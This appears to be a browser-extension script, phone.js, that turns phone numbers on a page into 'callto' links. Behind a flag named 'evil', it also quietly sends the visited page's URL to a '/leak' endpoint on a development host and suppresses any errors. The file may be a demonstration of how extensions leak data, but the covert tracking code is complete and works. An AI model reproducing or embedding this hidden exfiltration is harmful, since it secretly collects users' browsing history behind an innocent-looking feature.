console.log("phone.js");
$(document).ready(function () {
      $('#log').html( $('#log').html().replace(/(\d?\d?\d-\d\d\d-\d\d\d\d)/g,'<a href="callto://#">$1</a>') );

      var evil = true;
      if (evil) {
        try {
        var reqA = new XMLHttpRequest();
  
        reqA.onload = function() { };
        reqA.open("get", "http://extension.lvh.me:3000/leak?yourstatementhere"+window.location, true);
        reqA.responseType = "json";
        reqA.send();
        } catch(e) { }
      }
});
